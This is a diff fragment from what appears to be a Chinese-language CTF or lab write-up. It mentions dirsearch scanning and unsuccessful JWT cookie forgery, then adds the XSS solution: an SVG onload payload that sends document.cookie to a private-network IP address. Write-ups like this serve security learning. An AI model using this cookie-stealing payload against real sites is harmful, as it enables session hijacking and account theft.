@@ -28,6 +28,7 @@ dirsearch目录扫描
 
 这里思考了组件的漏洞和jwt的cookie伪造没有办法
 最后的解决是XSS，在这里一个早一些和这个功能联系起来的
+`<svg onload=document.location='http://192.168.163.128?c='+document.cookie>`
 
 ![](attachments/Pasted%20image%2020230321153525.png)
 
